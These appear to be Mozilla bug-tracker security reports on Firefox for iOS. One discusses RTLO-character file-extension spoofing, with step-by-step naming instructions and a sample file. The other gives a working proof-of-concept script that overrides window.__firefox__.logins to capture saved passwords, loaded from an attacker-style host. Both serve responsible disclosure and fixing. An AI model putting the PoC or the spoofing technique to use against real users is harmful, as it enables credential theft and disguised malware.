I see, the file `regedt%E2%80%AEgpj.apk` downloads as `regedtkpa.jpg`. I agree naming this according to the name of the file in the URL is a better approach in case someone discovers an exploit using this. What iOS does right however is that the filename doesn't change from what is presented to the user to what is downloaded to disk.

I think for this attack to work on iOS the name would have to change at some point in the process, as the change in the name is a key step to fool the user; I don't actually see how that could be performed in this flow.

In the provided example, is this different than if the attacker named the '.apk' file as a '.jpg'? Wouldn't that produce the exact same result on iOS?

The attacks in the description involve the file presented to the user as one filetype, and then opening as a different type after downloading. Can that happen on iOS? I am not seeing that.

I attached a video showing the flow, and the name behaving consistently during the flow.

Sorry for I don't approve with you opinion,

for this provided example, Only victim will mistake it's a jpg, But the ios system handle it with apk(because it's real apk file, just like a jpg).(Sorry for the platform, it doesn't execute the apk install)

I will provide another video, that the suffix the file is jpg, but actually the system recoginze it's real suffix zip

And I provide a video that chrome download and recoginze the file real suffix and display for compare

As for the platform, I tried the PC Firefox browser, it actions good that it rename the file as it's real file type(suffix) that just in keeping with the OS(that execute as the suffix name)

As for the andriod, sorry for I don't have a andriod phone beside meï¼Œ I will test it as soon as possible

The example file :

Summary: Illegal Rendered at Download Feature in firefox ios mobile App that Lead to Extension Manipulation (with RTLO) â†’ Download Feature: unicode RTLO char can fake the file extension

Hi, I have tried this one on both Brave and Opera touch and they also allow user to download file as whats described in the extension.

Not sure if I full understand but to me if I rename my file extension from an .mkv file to .mp4 then I'd download it as an .mp4 (That's how desktop browser also works)

I have few question(s)

a) If we were to change the extension name our self to reflect whats real then wouldn't that mean Firefox iOS is meddling with the file?

b) And say for sec reason we do change it then wouldn't that confuse the user as they are presented with some file but now in their downloads its different?

aï¼‰I think change the extension name to relect whats real doesn't mean medding with the file. It exposes the real extension name that user can do what they really want to do other than frauded to do. The user can avoid take wrong action because the RTLO illusory visual effect.

b) I don't think this is a problem Just like the Firefox for PC and Firefox for Andriod that change the '<RTLO\_Char>' to '\_'

the behavior of firefox for Andriod : <https://bug1649160.bmoattachments.org/attachment.cgi?id=9160293&t=PS55KmgVKVoJSgv6l7o6Nr>

I think there is something wrong,

1. the file name: malicious<RTLO\_Char><fake\_ext>.<real\_ext> . The system will handle as it's real suffix name real\_ext, For example: regedt<RTLO>jpg.exe
2. But it looks that regedtexe.jpg , it's real suffix name is exe. The system will action as it's the exe. The user will mistake it's a jpg, when they download something.

there has similarities to the Address Bar Spoofing As you can see:<https://www.rafaybaloch.com/2017/06/google-chrome-firefox-address-bar.html>

And the Opera(desktop browser) also change the name :

you can use the file :<https://drive.google.com/file/d/1e-uA9ipCdKdzpD9DSnua2ZQiM5bo0NEp/view>

the real plain name: regedt<RTLO>jpg.exe

the name with special char display: regedtgpj.exe

downloadedï¼šregedt\_gpj.apk

you can copy the string and rename a exe extension file in windows that looks like a jpg with system execute as a exe:

regedtgpj.exe

and try to taste the strangeness of the string

PR: <https://github.com/mozilla-mobile/firefox-ios/pull/6942>

Security Peers: I don't see on iOS how this is a particularly useful exploit due iOS file handling restrictions built-in to the OS. Android is less restrictive and can do things like install APKs and such, I don't see anything analogous to this on iOS.

I agree with you to some extent

I found another similar flaw in Firefox Lite for Andriod that would do things like install APKs , I think the vulnerability is sec-high as spoofing the full URI and I submit the report in <https://bugzilla.mozilla.org/show_bug.cgi?id=1649161>. Would you like to merge the reports?

[Demonstrate password stealing attack](attachment.cgi?id=9164918)
â€” [Details](attachment.cgi?id=9164918&action=edit)

User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_14\_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.2 Safari/605.1.15

Steps to reproduce:

Any web content can define rogue LoginsHelper (window.**firefox**.logins).

That can be abused for large-scale attacks by injecting malicious ad script to the page for stealing user's IDs and passwords.

(1) Victim visits <http://csrf.jp/2020/form.html>

(2) Victim enters (any) ID and password and login

(3) Login helper shows the snackbar to ask Victim to save the credentials, then Victim choose "Save Login"

(4) Victim clicks a link that goes to <http://csrf.jp/2020/anywhere.html>

(5) The above page (anywhere.html) has no HTML form and load Bad Ad script from <http://mallory.csrf.jp/2020/bad_ad.js>

(6) Bad Ad script defines window.**firefox**,logins object that steals IDs and passwords that were sent from LoginsHelper.swift

(7) All of the user's IDs and passwords are stolen by Bad Ad (see attached video for demonstration).

Actual results:

The reason why legitimate LoginsHelper is overridden is that LoginsHelper.js is injected at the timing of AtDocumentEnd.

<https://github.com/mozilla-mobile/firefox-ios/blob/76faae8c6c94e22c8fbc0de72e2d06f615738e2c/Client/Frontend/UserContent/UserScripts/AllFrames/AtDocumentEnd/LoginsHelper.js#L10>

WKWebView's JS hook lifecycle is below.

[1] AtDocumentStart -> [2] Load web document -> [3] AtDocumentEnd

In anywhere.html at (4), the page loads a mallicious ad script that contains exploit code.

```
<!-- Ad -->
<script src="//mallory.csrf.jp/2020/bad_ad.js"></script>

```

In bad\_ad.js at (6) define the mallicius LoginHelper as an immutable object at [2]. So the setting of legitimate helper at [3] is rejected.

```
function LoginInjector() {
  this.inject = function(msg) {
    // Steal password here
    alert("Hi victim! We got your passwords!");
    alert(JSON.stringify(msg));
  };
}

Object.defineProperty(window.__firefox__, "logins", {
  enumerable: false,
  configurable: false,
  writable: false,
  value: Object.freeze(new LoginInjector())
});

```

Expected results:

The legitimate LoginsHelper (window.**firefox**.logins) should be set at [1] AtDocumentStart.

If not possible, try to detect whether other helper is already set before, and not filling the ID and password in polluted pages.
